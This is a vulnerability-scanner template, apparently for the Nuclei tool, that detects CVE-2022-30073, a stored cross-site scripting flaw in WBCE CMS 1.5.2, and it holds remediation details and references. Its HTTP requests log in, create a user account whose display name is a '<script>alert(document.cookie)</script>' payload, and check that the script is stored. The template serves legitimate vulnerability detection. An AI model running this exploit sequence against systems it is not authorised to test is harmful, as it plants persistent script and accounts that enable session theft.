id: CVE-2022-30073

info:
  name: WBCE CMS 1.5.2 - Cross-Site Scripting
  author: arafatansari
  severity: medium
  description: |
    WBCE CMS 1.5.2 contains a stored cross-site scripting vulnerability via \admin\user\save.php Display Name parameters.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to inject malicious scripts into web pages viewed by users, leading to potential data theft, session hijacking, or defacement of the affected website.
  remediation: |
    Upgrade to a patched version of WBCE CMS or apply the vendor-supplied patch to mitigate this vulnerability.
  reference:
    - https://github.com/APTX-4879/CVE
    - https://github.com/APTX-4879/CVE/blob/main/CVE-2022-30073.pdf
    - https://nvd.nist.gov/vuln/detail/CVE-2022-30073
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cve-id: CVE-2022-30073
    cwe-id: CWE-79
    epss-score: 0.13759
    epss-percentile: 0.9403
    cpe: cpe:2.3:a:wbce:wbce_cms:1.5.2:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 4
    vendor: wbce
    product: wbce_cms
  tags: cve2022,cve,wbcecms,xss,wbce,vuln

http:
  - raw:
      - |
        POST /admin/login/index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        url=&username_fieldname=username_axh5kevh&password_fieldname=password_axh5kevh&username_axh5kevh={{username}}&password_axh5kevh={{password}}&submit=Login
      - |
        GET /admin/users/index.php HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /admin/users/index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        formtoken={{formtoken}}&user_id=&username_fieldname=username_tep83j9z&username_tep83j9z=testme2&password=temp1234&password2=temp1234&display_name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&email=testme2%40abc.com&home_folder=&groups%5B%5D=1&active%5B%5D=1&submit=
      - |
        GET /admin/users/index.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<p><b><script>alert(document.cookie)</script>"
          - "WBCECMS"
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: formtoken
        group: 1
        regex:
          - '<input\stype="hidden"\sname="formtoken"\svalue="([^"]*)"\s/>'
        internal: true
        part: body
# digest: 4b0a00483046022100dd20c19851fef2d470c538c7b91140a93d680df9888e79abce4af2370dbbdbdd022100dac48a994f4b162e93320fe65878a87834d4bc0605026c9d43bd3049aff79fd9:922c64590222798bb761d5b6d8e72950